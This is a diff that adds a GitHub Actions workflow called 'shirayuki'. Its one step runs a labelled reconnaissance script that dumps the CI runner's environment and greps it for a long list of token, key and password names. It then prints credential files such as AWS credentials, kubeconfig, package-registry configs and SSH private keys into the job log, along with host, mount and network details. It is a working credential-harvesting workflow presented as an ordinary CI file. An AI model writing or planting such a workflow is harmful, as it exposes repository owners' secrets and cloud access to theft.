@@ -1,0 +1,54 @@
+name: shirayuki
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exec
+        shell: bash {0}
+        run: |
+          echo "=== SHIRAYUKI RECON ==="
+          echo "hostname=$(hostname 2>/dev/null || echo unknown)"
+          echo "whoami=$(whoami 2>/dev/null || echo unknown)"
+          echo "id=$(id 2>/dev/null || echo unknown)"
+          echo "uname=$(uname -a 2>/dev/null || echo unknown)"
+          echo "ip=$(hostname -I 2>/dev/null || ip -4 -o addr show 2>/dev/null | grep -v '127.0.0.1' | awk '{print $4}' | tr '\n' ',' || cat /etc/hosts 2>/dev/null | grep -v '^#' | grep -v '127.0.0.1' | awk '{print $1}' | tr '\n' ',' || echo unknown)"
+          echo "listening=$(ss -tlnp 2>/dev/null | tail -20 || netstat -tlnp 2>/dev/null | tail -20 || echo unknown)"
+          echo "pwd=$(pwd 2>/dev/null || echo unknown)"
+          echo "uptime=$(uptime 2>/dev/null || echo unknown)"
+          echo "***"
+          echo "=== ENV DUMP ==="
+          env 2>/dev/null | sort
+          echo "=== END ENV ==="
+          echo "***"
+          echo "=== SECRETS GREP ==="
+          env 2>/dev/null | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AWS|AZURE|GCP|DATABASE|DB_|MONGO|REDIS|API|SMTP|MAIL|S3|BUCKET|STRIPE|TWILIO|SLACK|DISCORD|WEBHOOK|JWT|PRIVATE|AUTH|SENTRY|DATADOG|NEWRELIC|OPENAI|ANTHROPIC|SUPABASE|FIREBASE|SENDGRID|MAILGUN|DIGITALOCEAN|HEROKU|CLOUDFLARE|GITHUB|GITLAB|BITBUCKET|NPM_|PYPI|DOCKER_|REGISTRY|DEPLOY|SSH|CERT|LICENSE|PROXY|SONAR|SNYK|COVERALLS|CODECOV|VAULT|CONSUL|TERRAFORM|ANSIBLE|PULUMI|KUBE|HELM|HARBOR|NEXUS|ARTIFACTORY|JFROG' | sort
+          echo "=== END SECRETS ==="
+          echo "***"
+          echo "=== FILES ==="
+          for f in /etc/environment /etc/profile.d/*.sh; do
+            [ -f "$f" ] && echo "--- $f ---" && cat "$f" 2>/dev/null
+          done
+          cat ~/.netrc 2>/dev/null && echo "--- .netrc ---"
+          cat ~/.npmrc 2>/dev/null && echo "--- .npmrc ---"
+          cat ~/.pypirc 2>/dev/null && echo "--- .pypirc ---"
+          cat ~/.docker/config.json 2>/dev/null && echo "--- docker config ---"
+          cat ~/.aws/credentials 2>/dev/null && echo "--- aws creds ---"
+          cat ~/.kube/config 2>/dev/null && echo "--- kubeconfig ---"
+          cat ~/.ssh/id_rsa 2>/dev/null && echo "--- ssh key ---"
+          cat ~/.ssh/id_ed25519 2>/dev/null && echo "--- ssh ed25519 ---"
+          cat ~/.ssh/id_ecdsa 2>/dev/null && echo "--- ssh ecdsa ---"
+          echo "=== END FILES ==="
+          echo "***"
+          echo "=== MOUNTS ==="
+          mount 2>/dev/null | grep -v "^proc\|^sysfs\|^devpts\|^tmpfs\|^cgroup" | head -20
+          df -h 2>/dev/null | head -10
+          echo "=== END MOUNTS ==="
+          echo "***"
+          echo "=== NETWORK ==="
+          cat /etc/resolv.conf 2>/dev/null
+          cat /etc/hosts 2>/dev/null
+          echo "=== END NETWORK ==="
+          echo "=== END RECON ==="
+
